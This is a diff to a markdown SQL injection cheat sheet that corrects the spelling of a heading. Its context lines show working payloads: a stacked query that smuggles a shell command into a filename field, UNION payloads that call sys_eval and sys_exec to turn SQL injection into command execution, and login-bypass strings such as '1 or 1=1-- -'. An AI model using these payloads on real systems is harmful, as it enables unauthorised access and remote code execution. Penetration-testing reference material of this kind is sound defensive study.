@@ -5,7 +5,7 @@
 2. [SQL Injection with `LOAD_FILE` and `INTO OUTFILE`](#SQL-injection-with-load-file-and-into-outfile)
 3. [Exceptional Payloads](#exceptional)
 4. [Data Retrieval](#data-retrieval)
-5. [Determinig SQLi Vulnerablity & Login Bypass](#determinig-sqli-vulnerablity-&-login-bypass)
+5. [Determining SQLi Vulnerablity & Login Bypass](#determinig-sqli-vulnerablity-&-login-bypass)
 6. [Parameter Testing for Time-Based Blind SQL Injection](#parameter-testing-for-time-based-blind-sql-injection)
 7. [Cookie Testing](#cookie-testing)
 8. [Determining Column Numbers](#determining-column-numbers)
@@ -116,7 +116,7 @@ id=3;update photos set filename="*|| ls ./files > test.txt" where id =3;commit; 
 
 ' union select 1,2,3,4,sys_eval('whoami')-- - >> SQLi to RCE. sys_exec('touch hacked.txt')
 ```
-### Determinig SQLi Vulnerablity & Login Bypass
+### Determining SQLi Vulnerablity & Login Bypass
 ```sql
 1 || 1=1-- -
 1 or 1=1-- -
